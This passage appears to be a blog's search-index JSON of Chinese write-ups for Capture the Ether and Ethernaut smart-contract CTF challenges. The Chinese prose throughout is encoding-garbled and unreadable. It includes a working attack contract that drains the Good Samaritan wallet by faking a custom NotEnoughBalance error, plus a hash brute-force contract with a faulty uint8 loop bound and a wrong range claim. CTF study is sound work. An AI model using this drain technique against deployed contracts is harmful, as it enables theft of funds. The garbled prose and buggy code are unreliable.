è¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡æ„Ÿè§‰è‡ªå·±èƒ½æƒ³å‡ºæ¥çš„é¢˜ç›®äº†ã€‚ã€‚ã€‚ã€‚ 2.2 åæ­£ uint8 çš„èŒƒå›´æ˜¯ 0-256 å˜›ï¼Œç›´æ¥ å¾ªç¯ä¸€ä¸ªä¸€ä¸ªè›®åŠ›æ³•ï¼Œä¸€ä¸ªä¸€ä¸ªè¯•å‡ºæ¥ 2.3 å†™ä¸€ä¸ªHack åˆçº¦æ¥è®¡ç®—ï¼Œå“ˆå¸Œå€¼ä¸º ï¼š0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365 çš„æ•°å­— Hack åˆçº¦ä»£ç ï¼š 1234567891011121314contract Hack &#123; uint8 public number; bytes32 answer = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365; function f() public returns(uint8) &#123; for (uint8 i = 0; i &lt;= 256; i++) &#123; if (keccak256(i) == answer) &#123; number = i; break; &#125; &#125; return number; &#125;&#125; è¿è¡Œæ±‚å‡ºæ¥çš„ç»“æœæ˜¯ ï¼š170 3. è§£é¢˜ 3.1 éƒ¨ç½²åˆçº¦ 3.2 å°† 170 ä½œä¸ºå‚æ•°ï¼Œè°ƒç”¨guss() å‡½æ•° 3.3 åŒæ—¶å‰ä¸¤æ­¥æ“ä½œéƒ½éœ€è¦å°† msg.value è®¾ç½®ä¸º 1 ether ![image-20240412144923642](Guess the secret number&#x2F;image-20240412144923642.png)","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Guess the number","slug":"CTFS/capther the ether/Guess the number","date":"2023-03-20T04:39:10.000Z","updated":"2023-03-20T04:39:10.000Z","comments":true,"path":"2023/03/20/CTFS/capther the ether/Guess the number/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/20/CTFS/capther%20the%20ether/Guess%20the%20number/","excerpt":"","text":"Guess the number1. é¢˜ç›® Iâ€™m thinking of a number. All you have to do is guess it. é¢˜ç›®ä»£ç ï¼š 12345678910111213141516171819202122// SPDX-License-Identifier: MITpragma solidity ^0.4.21;contract GuessTheNumberChallenge &#123; uint8 answer = 42; function GuessTheNumberChallenge() public payable &#123; require(msg.value == 1 ether); &#125; function isComplete() public view returns (bool) &#123; return address(this).balance == 0; &#125; function guess(uint8 n) public payable &#123; require(msg.value == 1 ether); if (n == answer) &#123; msg.sender.transfer(2 ether); &#125; &#125;&#125; 2. åˆ†æ 2.1 è¿™é¢˜æ˜¯çŒœæ•°å­—ï¼Œä½†æ˜¯ä»–çš„æ•°å­—æ˜¯å†™æ­»çš„ï¼Œé€šè¿‡ ethersè¯»å–ã€‚ 2.2 ä½†æ˜¯éƒ¨ç½²å’Œ çŒœæ•°å­—éƒ½éœ€è¦æ”¯ä»˜ 1ether ï¼Œå³ä¸¤ä¸ªï¼Œå¦‚æœçŒœå¯¹äº†ä»–å°±ä¼šè¿”å›ä¹‹å‰æ”¯ä»˜çš„ether 3. è§£é¢˜ 3.1 éƒ¨ç½²ï¼Œmsg.value &#x3D; 1 ether ![image-20240412144722655](Guess the number&#x2F;image-20240412144722655.png) 3.2 è°ƒç”¨ guss() å‡½æ•° ![image-20240412144732902](Guess the number&#x2F;image-20240412144732902.png) 3.3 æŸ¥çœ‹åˆçº¦ä½™é¢ ![image-20240412144740840](Guess the number&#x2F;image-20240412144740840.png)","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Choose a nickname","slug":"CTFS/capther the ether/Choose a nickname","date":"2023-03-20T02:39:10.000Z","updated":"2023-03-20T02:39:10.000Z","comments":true,"path":"2023/03/20/CTFS/capther the ether/Choose a nickname/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/20/CTFS/capther%20the%20ether/Choose%20a%20nickname/","excerpt":"","text":"Choose a nickname1. é¢˜ç›® 1.1 æ™ºèƒ½åˆçº¦CaptureTheEtherä¼šè®°å½•æ¯ä¸ªç©å®¶çš„æ˜µç§°ã€‚è¦å®Œæˆæ­¤æŒ‘æˆ˜ï¼Œè¯·å°†æ‚¨çš„æ˜µç§°è®¾ç½®ä¸ºéç©ºå­—ç¬¦ä¸²ã€‚æ™ºèƒ½åˆçº¦åœ¨åœ°å€ çš„ Ropsten æµ‹è¯•ç½‘ç»œä¸Šè¿è¡Œ0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4feeã€‚ 1.2 é¢˜ç›®ä»£ç  123456789101112131415161718192021222324252627282930// SPDX-License-Identifier: MITpragma solidity ^0.4.21;// Relevant part of the CaptureTheEther contract.contract CaptureTheEther &#123; mapping (address =&gt; bytes32) public nicknameOf; function setNickname(bytes32 nickname) public &#123; nicknameOf[msg.sender] = nickname; &#125;&#125;// Challenge contract. You don&#x27;t need to do anything with this; it just verifies// that you set a nickname for yourself.contract NicknameChallenge &#123; CaptureTheEther cte = CaptureTheEther(msg.sender); address player; // Your address gets passed in as a constructor parameter. function NicknameChallenge(address _player) public &#123; player = _player; &#125; // Check that the first character is not null. function isComplete() public view returns (bool) &#123; return cte.nicknameOf(player)[0] != 0; &#125;&#125; 2. åˆ†æ 2.1 åªéœ€è¦å°†æˆåŠŸè°ƒç”¨setNickname() å‡½æ•°å³å¯ 2.2 è€ƒç‚¹åœ¨äºå¦‚ä½•å°†å­—ç¬¦ä¸²è½¬ä¸º64ä½ 16è¿›åˆ¶çš„æ•°æ®ç±»å‹ æˆ‘åœ¨idea ç¼–å†™äº†ä¸€ä¸ªç¨‹åºæ¥è§£å†³è¿™ä¸ªé—®é¢˜ 123456789101112131415161718192021222324252627282930313233package daily_temp;/** * @Auther: æŸšå­ * @Date:2023/3/24å¹´03æœˆ24æ—¥ 15:43 * @Description:daily_temp * @version: 1.0 */public class convertStringToHex &#123; public static void main(String[] args) &#123; covertStringToHex(&quot;biyou&quot;); &#125; static void covertStringToHex(String str) &#123; StringBuffer sb = new StringBuffer(); char[] chars = str.toCharArray(); for(char c : chars) &#123; String charToHex = Integer.toHexString(c); sb.append(charToHex); &#125; int length = sb.length(); for (int i = 0; i &lt; 64 - length; i++) &#123; sb.append(0); &#125; System.out.println(&quot;0x&quot; + sb.toString()); &#125;&#125; è¾“å…¥ä¸º biyou è¿è¡Œç»“æœä¸ºï¼š ![image-20240412144152362](Choose a nickname&#x2F;image-20240412144152362.png) ä»¥ 0x6269796f75000000000000000000000000000000000000000000000000000000 ä¸ºå‚æ•°ï¼Œè°ƒç”¨ setNickname() å‡½æ•°å³å¯ 3. è§£é¢˜ 3.1 éƒ¨ç½² 3.2 å°†è½¬åŒ–å¥½çš„æ•°æ®ä»¥å‚æ•°çš„å½¢å¼ä¼ å…¥ 3.3 ![image-20240412144208239](Choose a nickname&#x2F;image-20240412144208239.png)","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Call me","slug":"CTFS/capther the ether/Call me","date":"2023-03-20T02:37:10.000Z","updated":"2023-03-20T02:37:10.000Z","comments":true,"path":"2023/03/20/CTFS/capther the ether/Call me/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/20/CTFS/capther%20the%20ether/Call%20me/","excerpt":"","text":"Call me1. é¢˜ç›® 1.1 éƒ¨ç½²ä»¥ä¸‹åˆçº¦ 1.2 è°ƒç”¨å‘½åçš„å‡½æ•°callme 12345678910// SPDX-License-Identifier: MITpragma solidity ^0.4.21;contract CallMeChallenge &#123; bool public isComplete = false; function callme() public &#123; isComplete = true; &#125;&#125; 2. åˆ†æ 2.1 éƒ¨ç½²ï¼Œè°ƒç”¨å³å¯ 3. è§£é¢˜ 3.1 ![image-20240412143836389](Call me&#x2F;image-20240412143836389.png) 3.2 è°ƒç”¨ callme() å‡½æ•°ï¼Œå†æŸ¥çœ‹isCompleteçš„å€¼ ![image-20240412143918375](Call me&#x2F;image-20240412143918375.png)","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Deploy a contract","slug":"CTFS/capther the ether/Deploy a contract","date":"2023-03-20T02:33:10.000Z","updated":"2023-03-20T02:33:10.000Z","comments":true,"path":"2023/03/20/CTFS/capther the ether/Deploy a contract/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/20/CTFS/capther%20the%20ether/Deploy%20a%20contract/","excerpt":"","text":"Deploy a contracttipsï¼š å®è—åšå®¢1. é¢˜ç›®è¦æ±‚ 1.1 To complete this challenge, you need to: Install MetaMask. Switch to the Ropsten test network. Get some Ropsten ether. Clicking the â€œbuyâ€ button in MetaMask will take you to a faucet that gives out free test ether. After youâ€™ve done that, press the red button on the left to deploy the challenge contract. You donâ€™t need to do anything with the contract once itâ€™s deployed. Just click the â€œCheck Solutionâ€ button to verify that you deployed successfully. 1.2 é¢˜ç›®ä»£ç ï¼š 12345678pragma solidity ^0.4.21;contract DeployChallenge &#123; // This tells the CaptureTheFlag contract that the challenge is complete. function isComplete() public pure returns (bool) &#123; return true; &#125;&#125; 2. åˆ†æ 2.1 è¯¥é¢˜å¾ˆç®€å•ï¼Œç›´æ¥æ”¾åˆ°remix ä¸Šé¢éƒ¨ç½²å°±ok äº† 3. è§£é¢˜","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Good Samaritan","slug":"CTFS/ethernaut/Good Samaritan","date":"2023-03-13T05:29:10.000Z","updated":"2023-03-13T05:29:10.000Z","comments":true,"path":"2023/03/13/CTFS/ethernaut/Good Samaritan/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/13/CTFS/ethernaut/Good%20Samaritan/","excerpt":"","text":"Good Samaritan1. é¢˜ç›® 1.1 This instance represents a Good Samaritan that is wealthy and ready to donate some coins to anyone requesting it. Would you be able to drain all the balance from his Wallet? Things that might help: Solidity Custom Errors 1.2 é¢˜ç›®ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103// SPDX-License-Identifier: MITpragma solidity &gt;=0.8.0 &lt;0.9.0;import &quot;openzeppelin-contracts-08/utils/Address.sol&quot;;contract GoodSamaritan &#123; Wallet public wallet; Coin public coin; constructor() &#123; wallet = new Wallet(); coin = new Coin(address(wallet)); wallet.setCoin(coin); &#125; function requestDonation() external returns(bool enoughBalance)&#123; // donate 10 coins to requester try wallet.donate10(msg.sender) &#123; return true; &#125; catch (bytes memory err) &#123; if (keccak256(abi.encodeWithSignature(&quot;NotEnoughBalance()&quot;)) == keccak256(err)) &#123; // send the coins left wallet.transferRemainder(msg.sender); return false; &#125; &#125; &#125;&#125;contract Coin &#123; using Address for address; mapping(address =&gt; uint256) public balances; error InsufficientBalance(uint256 current, uint256 required); constructor(address wallet_) &#123; // one million coins for Good Samaritan initially balances[wallet_] = 10**6; &#125; function transfer(address dest_, uint256 amount_) external &#123; uint256 currentBalance = balances[msg.sender]; // transfer only occurs if balance is enough if(amount_ &lt;= currentBalance) &#123; balances[msg.sender] -= amount_; balances[dest_] += amount_; if(dest_.isContract()) &#123; // notify contract INotifyable(dest_).notify(amount_); &#125; &#125; else &#123; revert InsufficientBalance(currentBalance, amount_); &#125; &#125;&#125;contract Wallet &#123; // The owner of the wallet instance address public owner; Coin public coin; error OnlyOwner(); error NotEnoughBalance(); modifier onlyOwner() &#123; if(msg.sender != owner) &#123; revert OnlyOwner(); &#125; _; &#125; constructor() &#123; owner = msg.sender; &#125; function donate10(address dest_) external onlyOwner &#123; // check balance left if (coin.balances(address(this)) &lt; 10) &#123; revert NotEnoughBalance(); &#125; else &#123; // donate 10 coins coin.transfer(dest_, 10); &#125; &#125; function transferRemainder(address dest_) external onlyOwner &#123; // transfer balance left coin.transfer(dest_, coin.balances(address(this))); &#125; function setCoin(Coin coin_) external onlyOwner &#123; coin = coin_; &#125;&#125;interface INotifyable &#123; function notify(uint256 amount) external;&#125; 2. åˆ†æ ç®€å•åˆ†æå„ä¸ªåˆçº¦çš„ä½œç”¨ã€‚ Walletåˆçº¦ transferRemainder() ï¼šå°†é’±åŒ…æ‰€æœ‰é‡‘é¢å…¨éƒ¨è½¬ç§»ç»™dest_ï¼Œè°ƒç”¨è€…ä¸ºåˆçº¦æ‰€æœ‰è€…ã€‚ setCoin()ï¼šè®¾ç½®é’±åŒ…ä¸­çš„è´§å¸åœ°å€ï¼Œè°ƒç”¨è€…ä¸ºåˆçº¦æ‰€ç”¨è€…ã€‚ donate10()ï¼šé»˜è®¤å‘æŒ‡å®šåœ°å€è½¬è´¦ 10tokensï¼Œå½“ä½™é¢ä¸è¶³æ—¶ï¼Œåˆ™ä¼šæŠ›å‡ºè‡ªå®šä¹‰é”™è¯¯NotEnoughBalance()ï¼Œè°ƒç”¨è€…ä¸ºåˆçº¦æ‰€ç”¨è€…ã€‚ Coinåˆçº¦ å…¶åªæœ‰ä¸€ä¸ªå‡½æ•°ï¼Œä»”ç»†åˆ†æè¯¥å‡½æ•° 12345678910111213141516function transfer(address dest_, uint256 amount_) external &#123; uint256 currentBalance = balances[msg.sender]; // transfer only occurs if balance is enough if(amount_ &lt;= currentBalance) &#123; balances[msg.sender] -= amount_; balances[dest_] += amount_; if(dest_.isContract()) &#123; // notify contract INotifyable(dest_).notify(amount_); &#125; &#125; else &#123; revert InsufficientBalance(currentBalance, amount_); &#125;&#125; è¯¥å‡½æ•°å®ç°äº†ä¸€ä¸ªè½¬è´¦çš„åŠŸèƒ½ï¼Œå½“è½¬è´¦é‡‘é¢å¤§äºè°ƒç”¨è€…çš„ä½™é¢æ—¶åˆ™ä¼šæŠ¥é”™ã€‚ å¦åˆ™æ­£å¸¸æ‰§è¡Œï¼Œä½†å¦‚æœç›®çš„åœ°å€æ˜¯ä¸€ä¸ªåˆçº¦ï¼Œåˆ™ä¼šæ‰§è¡ŒINotifyable(dest_).notify(amount_);ï¼Œè¿™æ˜¯ä¸€ä¸ªæ¼æ´ï¼Œä¸€ä¸ªå®‰å…¨éšæ‚£ã€‚ GoodSamaritanåˆçº¦ åˆ†æå‡½æ•° 123456789101112function requestDonation() external returns(bool enoughBalance)&#123; // donate 10 coins to requester try wallet.donate10(msg.sender) &#123; return true; &#125; catch (bytes memory err) &#123; if (keccak256(abi.encodeWithSignature(&quot;NotEnoughBalance()&quot;)) == keccak256(err)) &#123; // send the coins left wallet.transferRemainder(msg.sender); return false; &#125; &#125;&#125; è¿™æ˜¯é¢˜ç›®äº¤äº’çš„åˆçº¦ï¼Œå¦‚æœè°ƒç”¨è¯¥å‡½æ•°è¿”å›NotEnoughBalance()ï¼Œåˆ™ä¼šå°†å‰©ä¸‹çš„é‡‘é¢å…¨éƒ¨è½¬ç»™è°ƒç”¨è€…ã€‚å½“ç„¶è¿™ç§æƒ…å†µåœ¨é’±åŒ…ä½™é¢ä¸è¶³çš„æ—¶å€™æ‰ä¼šå‘é€ã€‚ä½†æ˜¯å‰é¢Coinåˆçº¦ä¸­æœ‰ä¸€ä¸ªå®‰å…¨éšæ‚£ï¼ŒINotifyable(dest_).notify(amount_);å¦‚æœè¯¥å‡½æ•°è¿”å› revert NotEnoughBalance();ä¾¿å¯ä»¥æ¬ºéª—æ’’ç›åˆ©äºšäººï¼Œè®©ä»–ä¹–ä¹–çš„ä¸€æ¬¡æ€§å°†é’±å…¨éƒ¨äº¤å‡ºæ¥ã€‚ ä¸è¿‡å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œnotify()å‡½æ•°ä¸èƒ½ç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œå› ä¸ºåœ¨æ‰§è¡Œwallet.transferRemainder(msg.sender);ä¸­ä»ç„¶ä¼šè°ƒç”¨åˆ°notify() 3. è§£é¢˜æ”»å‡»åˆçº¦ 123456789101112131415161718192021222324contract Hack is INotifyable &#123; GoodSamaritan goodsamaritan; Coin coin; constructor(address _goodsamaritan) &#123; goodsamaritan = GoodSamaritan(_goodsamaritan); coin = goodsamaritan.coin(); &#125; error NotEnoughBalance(); function notify(uint256 amount) external &#123; if (amount == 10) &#123; revert NotEnoughBalance(); &#125; &#125; function attack() public &#123; goodsamaritan.requestDonation(); require(coin.balances(address(goodsamaritan.wallet())) == 0, &quot;wallet is not null&quot;); &#125;&#125; é€šè¿‡å®ä¾‹éƒ¨ç½²æ”»å‡»åˆçº¦ï¼Œè°ƒç”¨attack()å‡½æ•°å³å¯å®Œæˆæ”»å‡»ã€‚","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"DoubleEntryPoint","slug":"CTFS/ethernaut/DoubleEntryPoint","date":"2023-03-13T04:20:10.000Z","updated":"2023-03-13T04:20:10.000Z","comments":true,"path":"2023/03/13/CTFS/ethernaut/DoubleEntryPoint/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/13/CTFS/ethernaut/DoubleEntryPoint/","excerpt":"","text":"DoubleEntryPoint1. é¢˜ç›®è¦æ±‚ 1.1 æ­¤çº§åˆ«å…·æœ‰CryptoVaultç‰¹æ®ŠåŠŸèƒ½ï¼ŒsweepTokenåŠŸèƒ½ã€‚è¿™æ˜¯ç”¨äºæ£€ç´¢å¡åœ¨åˆçº¦ä¸­çš„ä»£å¸çš„å¸¸ç”¨å‡½æ•°ã€‚æ“ä½œCryptoVaultä½¿ç”¨underlyingæ— æ³•æ¸…é™¤çš„ä»¤ç‰Œï¼Œå› ä¸ºå®ƒæ˜¯ . çš„é‡è¦æ ¸å¿ƒé€»è¾‘ç»„ä»¶CryptoVaultã€‚å¯ä»¥æ¸…é™¤ä»»ä½•å…¶ä»–ä»¤ç‰Œã€‚ åº•å±‚ä»£å¸æ˜¯åˆçº¦å®šä¹‰ä¸­å®æ–½çš„ DET ä»£å¸çš„ä¸€ä¸ªå®ä¾‹DoubleEntryPointï¼Œå¹¶CryptoVaultæŒæœ‰ 100 ä¸ªå•ä½ã€‚æ­¤å¤–ï¼ŒCryptoVaultè¿˜æ‹¥æœ‰ 100 ä¸ªLegacyToken LGTã€‚ åœ¨æ­¤çº§åˆ«ä¸­ï¼Œæ‚¨åº”è¯¥æ‰¾å‡ºé”™è¯¯æ‰€åœ¨CryptoVaultå¹¶é˜²æ­¢å®ƒè¢«è€—å°½ä»¤ç‰Œã€‚ è¯¥åˆçº¦å…·æœ‰Fortaåˆçº¦åŠŸèƒ½ï¼Œä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥æ³¨å†Œè‡ªå·±çš„detection botåˆçº¦ã€‚Forta æ˜¯ä¸€ä¸ªå»ä¸­å¿ƒåŒ–çš„ã€åŸºäºç¤¾åŒºçš„ç›‘æ§ç½‘ç»œï¼Œç”¨äºå°½å¿«æ£€æµ‹ DeFiã€NFTã€æ²»ç†ã€æ¡¥æ¢å’Œå…¶ä»– Web3 ç³»ç»Ÿä¸Šçš„å¨èƒå’Œå¼‚å¸¸ã€‚ä½ çš„å·¥ä½œæ˜¯å®ç°ä¸€ä¸ªdetection botå¹¶åœ¨åˆçº¦ä¸­æ³¨å†Œå®ƒFortaã€‚æœºå™¨äººçš„å®æ–½å°†éœ€è¦å‘å‡ºæ­£ç¡®çš„è­¦æŠ¥ï¼Œä»¥é˜²æ­¢æ½œåœ¨çš„æ”»å‡»æˆ–æ¼æ´åˆ©ç”¨ã€‚ å¯èƒ½æœ‰å¸®åŠ©çš„äº‹æƒ…ï¼š åŒå…¥å£ç‚¹å¦‚ä½•ä¸ºä»£å¸åˆçº¦å·¥ä½œï¼Ÿ 1.2 é¢˜ç›®ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;;import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;interface DelegateERC20 &#123; function delegateTransfer(address to, uint256 value, address origSender) external returns (bool);&#125;interface IDetectionBot &#123; function handleTransaction(address user, bytes calldata msgData) external;&#125;interface IForta &#123; function setDetectionBot(address detectionBotAddress) external; function notify(address user, bytes calldata msgData) external; function raiseAlert(address user) external;&#125;contract Forta is IForta &#123; mapping(address =&gt; IDetectionBot) public usersDetectionBots; mapping(address =&gt; uint256) public botRaisedAlerts; function setDetectionBot(address detectionBotAddress) external override &#123; usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress); &#125; function notify(address user, bytes calldata msgData) external override &#123; if(address(usersDetectionBots[user]) == address(0)) return; try usersDetectionBots[user].handleTransaction(user, msgData) &#123; return; &#125; catch &#123;&#125; &#125; function raiseAlert(address user) external override &#123; if(address(usersDetectionBots[user]) != msg.sender) return; botRaisedAlerts[msg.sender] += 1; &#125; &#125;contract CryptoVault &#123; address public sweptTokensRecipient; IERC20 public underlying; constructor(address recipient) &#123; sweptTokensRecipient = recipient; &#125; function setUnderlying(address latestToken) public &#123; require(address(underlying) == address(0), &quot;Already set&quot;); underlying = IERC20(latestToken); &#125; /* ... */ function sweepToken(IERC20 token) public &#123; require(token != underlying, &quot;Can&#x27;t transfer underlying token&quot;); token.transfer(sweptTokensRecipient, token.balanceOf(address(this))); &#125;&#125;contract LegacyToken is ERC20(&quot;LegacyToken&quot;, &quot;LGT&quot;), Ownable &#123; DelegateERC20 public delegate; function mint(address to, uint256 amount) public onlyOwner &#123; _mint(to, amount); &#125; function delegateToNewContract(DelegateERC20 newContract) public onlyOwner &#123; delegate = newContract; &#125; function transfer(address to, uint256 value) public override returns (bool) &#123; if (address(delegate) == address(0)) &#123; return super.transfer(to, value); &#125; else &#123; return delegate.delegateTransfer(to, value, msg.sender); &#125; &#125;&#125;contract DoubleEntryPoint is ERC20(&quot;DoubleEntryPointToken&quot;, &quot;DET&quot;), DelegateERC20, Ownable &#123; address public cryptoVault; address public player; address public delegatedFrom; Forta public forta; constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) &#123; delegatedFrom = legacyToken; forta = Forta(fortaAddress); player = playerAddress; cryptoVault = vaultAddress; _mint(cryptoVault, 100 ether); &#125; modifier onlyDelegateFrom() &#123; require(msg.sender == delegatedFrom, &quot;Not legacy contract&quot;); _; &#125; modifier fortaNotify() &#123; address detectionBot = address(forta.usersDetectionBots(player)); // Cache old number of bot alerts uint256 previousValue = forta.botRaisedAlerts(detectionBot); // Notify Forta forta.notify(player, msg.data); // Continue execution _; // Check if alarms have been raised if(forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;); &#125; function delegateTransfer( address to, uint256 value, address origSender ) public override onlyDelegateFrom fortaNotify returns (bool) &#123; _transfer(origSender, to, value); return true; &#125;&#125; 2. åˆ†æ è¿™ä¸ªæŒ‘æˆ˜ä¼¼ä¹æ˜¯ OpenZeppelin å’Œ Forta ä¹‹é—´çš„åˆèµ„ä¼ä¸šï¼Œä¸€ä¸ªå®æ—¶å®‰å…¨å’Œæ“ä½œç›‘æ§ã€‚æ®æˆ‘æ‰€çŸ¥ï¼Œè¯•å›¾å‘æ‚¨è§£é‡Šæ‚¨åº”è¯¥å¦‚ä½•é›†æˆ Forta ç³»ç»Ÿæ¥ç›‘æ§æ‚¨çš„åˆåŒæ˜¯ä¸€ä¸ªæŒ‘æˆ˜ã€‚è®©æˆ‘ä»¬çœ‹çœ‹è¿›å±•å¦‚ä½•ã€‚ ä»æŒ‘æˆ˜çš„æè¿°ï¼ˆè¯´å®è¯ä¸æ¸…æ¥šï¼‰æˆ‘ä»¬æœ‰ä¸¤ä¸ªä»¤ç‰Œï¼šLegacyTokené¡¾åæ€ä¹‰æ˜¯ä¸€ä¸ªå·²â€œå¼ƒç”¨â€çš„ä»¤ç‰Œï¼ˆè¿™åœ¨ç°å®ç”Ÿæ´»ä¸­å‘ç”Ÿè¿‡å—ï¼Ÿï¼‰æ”¯æŒä¸€ä¸ªåä¸ºDoubleEntryPoint. æˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ªç§°ä¸º Vault çš„åº“CryptoVaultï¼Œå®ƒå…·æœ‰ä¸€äº›åŠŸèƒ½ï¼ˆä¸æŒ‘æˆ˜èŒƒå›´æ— å…³ï¼‰ï¼Œå¹¶æä¾›ä¸€ç§ç§°ä¸ºå®ç”¨ç¨‹åºçš„æ–¹æ³•ï¼Œå…è®¸sweepToken(IERC20 token)ä»»ä½•äººâ€œæ‰«æâ€ï¼ˆè½¬ç§»ï¼‰åˆ°sweptTokensRecipientï¼ˆéƒ¨ç½²æ—¶å®šä¹‰çš„åœ°å€ï¼‰å·²å‘é€çš„ä»¤ç‰Œä¸å°å¿ƒå»äº†é‡‘åº“ã€‚è¯¥å‡½æ•°ä¸­å”¯ä¸€çš„æ£€æŸ¥æ˜¯æ‚¨ä¸èƒ½æ‰«é™¤underlyingVault çš„ä»¤ç‰Œã€‚ åœ¨éƒ¨ç½²æ—¶ï¼Œæˆ‘ä»¬ä»è¿™ä¸ªé…ç½®å¼€å§‹ï¼š CryptoVaultæŒæœ‰100 ä¸ª DET ( DoubleEntryToken) CryptoVaultæŒæœ‰100 LGT ( LegacyToken) æˆ‘ä»¬çš„ç›®æ ‡æ˜¯åˆ›å»ºä¸€ä¸ªForta DetectionBotæ¥ç›‘æ§åˆçº¦å¹¶é˜²æ­¢å¤–éƒ¨æ”»å‡»è€…è€—å°½æœ¬CryptoVaultä¸åº”è€—å°½çš„ä»£å¸ã€‚ è®©æˆ‘ä»¬å›é¡¾ä¸€ä¸‹æ¯ä¸ªåˆåŒï¼Œçœ‹çœ‹æˆ‘ä»¬æ˜¯å¦èƒ½æ‰¾åˆ°ä¸€äº›æ”»å‡»åª’ä»‹ã€‚ LegacyToken.sol12345678910111213141516171819contract LegacyToken is ERC20(&quot;LegacyToken&quot;, &quot;LGT&quot;), Ownable &#123; DelegateERC20 public delegate; function mint(address to, uint256 amount) public onlyOwner &#123; _mint(to, amount); &#125; function delegateToNewContract(DelegateERC20 newContract) public onlyOwner &#123; delegate = newContract; &#125; function transfer(address to, uint256 value) public override returns (bool) &#123; if (address(delegate) == address(0)) &#123; return super.transfer(to, value); &#125; else &#123; return delegate.delegateTransfer(to, value, msg.sender); &#125; &#125;&#125; å®ƒæ˜¯ä¸€ä¸ªERC20ç»§æ‰¿è‡ªçš„ä»¤ç‰ŒOwnableã€‚åˆçº¦ownerçš„ å¯ä»¥é€šè¿‡è°ƒç”¨mintæ–°ä»£å¸å’Œæ›´æ–°å˜é‡çš„å€¼ã€‚delegate``delegateToNewContract å¥‡æ€ªçš„éƒ¨åˆ†æ˜¯åœ¨transferè¦†ç›–äº†æ ‡å‡†æä¾›çš„é»˜è®¤å‡½æ•°çš„å‡½æ•°ä¸­ERC20ã€‚ å¦‚æœæ²¡æœ‰å®šä¹‰å§”æ‰˜ï¼ˆaddress(delegate) == address(0)ï¼‰ï¼Œåˆ™åˆçº¦ä½¿ç”¨æ ‡å‡†çš„é»˜è®¤é€»è¾‘ERC20ï¼›å¦åˆ™æ‰§è¡Œreturn delegate.delegateTransfer(to, value, msg.sender)ã€‚ 